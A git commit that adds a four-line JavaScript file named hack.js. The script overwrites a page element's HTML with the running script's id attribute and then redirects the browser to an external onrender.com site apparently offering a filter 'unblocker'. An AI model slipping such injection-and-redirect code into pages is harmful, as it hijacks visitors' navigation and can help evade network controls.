cd9ddb31918b544484ff4398ee8779afd04c8753
Crazystuffxyz <125907466+crazystuffxyz@users.noreply.github.com>
2025-04-13 11:01:56 -0400

    Create hack.js

---
+++ hack.js
@@ -0,0 +1,4 @@
+var image = document.querySelector("#ibhuigvyutcyfubhuyvtrc75xe46r6tv7ybG");
+var script = document.currentScript;
+image.outerHTML = script.id;
+location.href = "https://mass-unblocker-scraper-v2.onrender.com";
